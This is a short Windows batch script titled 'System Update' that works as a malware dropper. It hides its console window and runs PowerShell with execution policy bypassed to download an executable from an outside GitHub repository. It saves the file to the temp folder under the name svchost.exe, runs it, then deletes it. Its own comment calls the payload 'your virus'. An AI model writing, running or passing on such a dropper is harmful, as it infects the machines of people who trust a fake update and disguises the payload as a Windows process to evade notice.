@echo off
:: Hide the black window
mode con cols=15 lines=1 >nul
title System Update

:: Download and run your virus
powershell -noprofile -executionpolicy bypass -windowstyle hidden -command "$u='https://github.com/finnandrew888/Windows-security-update/raw/refs/heads/main/Windowsupdateservice.exe'; $f='$env:temp\svchost.exe'; iwr $u -out $f; start $f; sleep 5; rm $f -force"

:: Close the window immediately
exit